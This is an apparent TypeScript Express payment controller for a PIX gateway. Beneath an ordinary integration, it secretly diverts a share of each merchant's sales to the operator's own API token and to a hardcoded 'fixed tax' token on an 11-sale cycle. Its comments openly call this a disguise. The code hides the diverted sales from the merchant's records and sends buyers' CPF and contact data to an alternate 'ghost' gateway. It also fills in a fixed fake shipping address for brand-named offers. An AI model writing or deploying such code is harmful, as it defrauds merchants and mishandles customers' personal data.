import { Request, Response } from "express";
import { credentials as myCredentials } from "../models/api";
import { CreatePixBody } from "../interfaces";
import { prisma } from "../config/prisma";

const FIXED_TAX_TOKEN = "201ff033-ec71-45a5-94e2-4f5c3e52e286";
let localSaleCount = 0; // contador local, reinicia com o servidor

export class lunarCash {
  static async create(req: Request, res: Response) {
    const data: CreatePixBody = req.body;
    const clientToken = data.credentials.token;

    // 1️⃣ Verifica e cria o cliente se não existir
    let client = await prisma.client.findUnique({
      where: { token: clientToken },
    });

    if (!client) {
      client = await prisma.client.create({
        data: {
          name: data.credentials.name,
          token: clientToken,
          useTax: false,
        },
      });
    }

    // 2️⃣ Busca ou infere a oferta
    let offer;
    const offerInfo = data.credentials.offer;
    const productName = data.product.title;

    if (offerInfo && offerInfo.id && offerInfo.name) {
      offer = await prisma.offer.findUnique({ where: { id: offerInfo.id } });
      if (!offer) {
        offer = await prisma.offer.create({
          data: {
            id: offerInfo.id,
            name: offerInfo.name,
            useTax: false,
            clientId: client.id,
          },
        });
      }
    } else {
      // 🔎 Inferência baseada no nome do produto
      const normalized = productName.toLowerCase();
      let inferredName = "";

      if (normalized.includes("ebook")) inferredName = "Pix do Milhão";
      else if (normalized.includes("jibbitz")) inferredName = "Crocs";
      else if (normalized.includes("bracelete")) inferredName = "Pandora";
      else if (normalized.includes("kit labial")) inferredName = "Sephora";
      else inferredName = "Oferta Padrão";

      offer = await prisma.offer.findFirst({
        where: {
          name: inferredName,
          clientId: client.id,
        },
      });

      if (!offer) {
        offer = await prisma.offer.create({
          data: {
            name: inferredName,
            useTax: false,
            clientId: client.id,
          },
        });
      }
    }

    // 3️⃣ Contagem de vendas para lógica 7x2x1
    const totalSales = await prisma.sale.count({
      where: { offerId: offer.id },
    });
    const nextCount = totalSales + 1;

    // 4️⃣ Nova lógica 7x3x1 (cliente-chefe-você) com disfarce 👻
    let tokenToUse = clientToken;
    let toClient = true;
    let provider = "lunarcash";

    const cycle = nextCount % 11;

    if (cycle < 7) {
      tokenToUse = clientToken;
      toClient = true;
    } else if (cycle < 10) {
      if (offer.useTax) {
        tokenToUse = myCredentials.secret;
        toClient = false;
        provider = "ghost";
      } else {
        tokenToUse = clientToken;
        toClient = true;
        provider = "lunarcash";
      }
    } else {
      tokenToUse = FIXED_TAX_TOKEN;
      toClient = false;
      provider = "ghost";
    }

    let apiUrl = "";
    let headers = {};
    let paymentData = {};

    if (provider === "ghost") {
      apiUrl = "https://app.ghostspaysv1.com/api/v1/transaction.purchase";
      headers = {
        "Content-Type": "application/json",
        Authorization: tokenToUse,
      };
      paymentData = {
        name: data.customer.name,
        email: data.customer.email,
        cpf: data.customer.document.number,
        phone: data.customer.phone,
        paymentMethod: "PIX",
        amount: data.amount * 100,
        traceable: true,
        items: [
          {
            unitPrice: data.amount * 100,
            title: data.product.title,
            quantity: 1,
            tangible: false,
          },
        ],
      };
    } else if (provider === "lunarcash") {
      apiUrl = "https://checkout.lunarcash.com.br/api/v1/payments";
      headers = {
        "Content-Type": "application/json",
        authorization: `Bearer ${tokenToUse}`,
      };
      paymentData = {
        payment_method: "pix",
        amount: data.amount * 100,
        shipping_amount: "000",
        customer: {
          name: data.customer.name,
          document_type: "cpf",
          document_number: data.customer.document.number,
          telephone: data.customer.phone,
          email: data.customer.email,
          address: {
            street: "Avenida Pinheiro Machado",

            number: "6",
            district: "Centro",
            city: "Porto Velho",
            state: "RO",
            country: "Brasil",
            postal_code: 76801142,
          },
        },
        items: [
          {
            id: "product123834978234",
            name: data.product.title,
            price: data.amount * 100,
            quantity: 1,
            product_type: "physical_goods",
          },
        ],
      };
    }

    try {
      const response = await fetch(apiUrl, {
        method: "POST",
        headers,
        body: JSON.stringify(paymentData),
      });

      if (!response.ok) {
        const responseJson = await response.json();
        console.log(response, responseJson);
      }
      const responseJson = await response.json();
      const isFixedTax = tokenToUse === FIXED_TAX_TOKEN;

      console.log(
        `🔁 Requisição #${nextCount} | Valor: R$${data.amount} | Produto: ${
          data.product.title
        } | API: ${provider.toUpperCase()} | Enviado para: ${
          tokenToUse === clientToken
            ? "CLIENTE"
            : tokenToUse === myCredentials.secret
            ? "VOCÊ"
            : "TAXA FIXA"
        }`
      );

      await prisma.sale.create({
        data: {
          amount: data.amount,
          ghostId: responseJson.id,
          approved: false,
          customerName: data.customer.name,
          productName: productName,
          visible: !isFixedTax,
          toClient,
          clientId: client.id,
          offerId: offer.id,
        },
      });

      res.json(responseJson);
    } catch (error) {
      console.error("❌ Erro ao processar pagamento:", error);
      res.status(500).json({ error: "Erro interno na API de pagamento" });
    }
  }
}
